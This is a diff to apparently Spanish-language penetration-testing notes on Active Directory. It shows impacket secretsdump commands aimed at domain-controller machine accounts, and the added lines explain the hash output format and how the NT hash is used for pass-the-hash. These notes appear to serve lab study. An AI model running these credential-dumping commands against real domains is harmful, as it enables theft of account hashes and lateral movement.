@@ -161,7 +161,9 @@ impacket-secretsdump -k -no-pass -history -dc-ip 10.10.10.10 'CORP.LOCAL/DC01$'@
 python3 secretsdump.py inlanefreight.local/dc01\$@10.129.234.174 -hashes <HASH_NTLM_AQUÍ> 
 
 ## IMPORTANTE
-obtendremos 
+obtendremos los hashes en este formato:
+domain\uid:rid:lmhash:nthash
+Asi que tomaremos el ultimo apartado de :nthash para acontecer un pass the hash
 ```
 
 ### Caso 4: Cuenta de Máquina Estándar (`WORKSTATION$` o `SERVER$`)
